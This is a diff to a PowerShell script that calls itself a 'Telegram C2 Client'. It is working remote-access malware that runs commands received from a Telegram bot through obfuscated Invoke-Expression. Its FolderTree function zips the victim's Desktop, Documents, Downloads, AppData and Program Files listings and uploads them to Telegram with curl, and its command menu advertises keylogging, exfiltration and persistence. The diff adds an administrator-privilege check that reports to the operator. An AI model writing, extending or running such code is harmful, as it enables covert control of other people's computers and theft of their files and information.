@@ -3,7 +3,7 @@
 $Token = "$tg"  # Your Telegram Token
 $GHurl = "$gh" # Your Url to a textfile (NOT REQUIRED)
 
-# Define Script Variables
+# Define Connection Variables
 $killphrase = "True"
 $PassPhrase = "$env:COMPUTERNAME"
 $URL='https://api.telegram.org/bot{0}' -f $Token
@@ -11,18 +11,23 @@ $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
+
+# Emoji characters
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
-$closed = [char]::ConvertFromUtf32(0x1F6AB)
+$closed = [char]::ConvertFromUtf32(0x274C)
 $waiting = [char]::ConvertFromUtf32(0x1F55C)
 $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
-Write-Output "Starting Telegram C2 Client"
-Sleep 10
+$pause = [char]::ConvertFromUtf32(0x23F8)
 
+# Startup Delay
+if(Test-Path "$env:APPDATA\Microsoft\Windows\copy.ps1"){
+Sleep 15
+}
+
+# remove pause file
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){
-rm -path "$env:TEMP\temp.ps1" -Force
 rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force
 rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force
 }
@@ -33,6 +38,9 @@ if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
 $MessageToSend = New-Object psobject 
 $MessageToSend | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+
+# Collect script contents
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 
 #----------------------------------------------- ON START ------------------------------------------------------
 
@@ -48,7 +56,7 @@ Start-Sleep 1
 $contents = "==============================================
 ========= $comp Telegram C2 Options List $comp ========
 ==============================================
-============ $cmde Commands List $cmde ============
+============= $cmde Commands List $cmde ============
 ==============================================
 Close   : Close this Session
 PauseSession   : Kills this session and restarts
@@ -61,6 +69,7 @@ Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
 RemovePersistance   : Remove Startup Persistance
+IsAdmin   : Checks if session has admin Privileges
 ==============================================
 ============ $glass Examples and Info $glass ===========
 ==============================================
@@ -419,23 +428,23 @@ Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 }
 
 Function FolderTree{
-
 tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
 tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
 tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
 tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
 tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
-
 $zipFilePath ="$env:temp/TreesOfKnowledge.zip"
 Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $zipFilePath
 sleep 1
 curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"
 rm -Path $zipFilePath -Force
-
 Write-Output "Done."
 }
 
 Function PauseSession{
+$contents = "$env:COMPUTERNAME $pause Pausing Session.."
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 if ($newScriptPath.Length -lt 100){
@@ -455,13 +464,30 @@ Start-Process -FilePath $pth
 rm -path "$env:TEMP\temp.ps1" -Force
 exit
 }
+
+
+Function IsAdmin{
+If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
+$contents = "$closed Session NOT Admin $closed"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+}
+else{
+$contents = "$tick Session IS Admin $tick"
+$params = @{chat_id = $ChatID ;text = $contents}
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+}
+}
+
+
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
+
 
 Function IsAuth{ 
 param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
         $script:AcceptedSession="Authenticated"
-        $contents = "$comp $env:COMPUTERNAME $tick Session Started"
+        $contents = "$comp $env:COMPUTERNAME $tick Session Starting"
         $params = @{chat_id = $ChatID ;text = $contents}
         Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
         ShowButtons
@@ -507,7 +533,7 @@ $messages=rtgmsg
             try{
                 $Result=ie`x($messages.message.text) -ErrorAction Stop
                 $Result
-                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration")){}
+                if (($result.length -eq 0) -or ($messages.message.text -contains "KeyCapture") -or ($messages.message.text -contains "Exfiltration") -or ($messages.message.text -contains "TreesOfKnowledge")){}
                 else{
                 stgmsg -Messagetext $Result -ChatID $messages.message.chat.id
                 }
@@ -516,3 +542,4 @@ $messages=rtgmsg
         }
     }
 }
+
